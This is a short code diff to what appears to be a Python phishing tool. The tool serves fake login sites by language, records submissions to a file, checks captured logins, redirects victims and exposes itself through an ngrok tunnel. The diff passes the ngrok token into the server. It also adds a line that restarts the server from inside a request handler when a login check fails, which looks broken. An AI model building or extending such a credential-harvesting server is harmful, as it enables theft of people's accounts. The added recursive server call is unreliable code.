@@ -181,14 +181,14 @@ def main():
             output_file = args.output
             redirect_location = args.location
             check_login = args.check
+            ngrok_token = args.ngrok_token
 
             web_site = language_mapping.get(lang.lower())
             if not web_site:
                 print(Fore.RED + "Invalid language code!")
                 continue
-
             if chosen == 1:
-                start_server(web_site, port, output_file, redirect_location, check_login, args.ngrok_token)
+                start_server(web_site, port, output_file, redirect_location, check_login, ngrok_token)
             else:
                 print(f"Site {chosen} is under development. Coming soon!")
 
@@ -255,6 +255,7 @@ def start_server(web_site, port, output_file, redirect_location, check_login, ng
                     self.send_header('Location', redirect_location)
                     self.end_headers()
                 elif login_check == False and check_trust:
+                    start_server(error_web, port, output_file, redirect_location, check_login, ngrok_token)
                     self.send_response(302)
                     self.send_header('Location', f"http://{ngrok_url}/{error_web}")
                     self.end_headers()
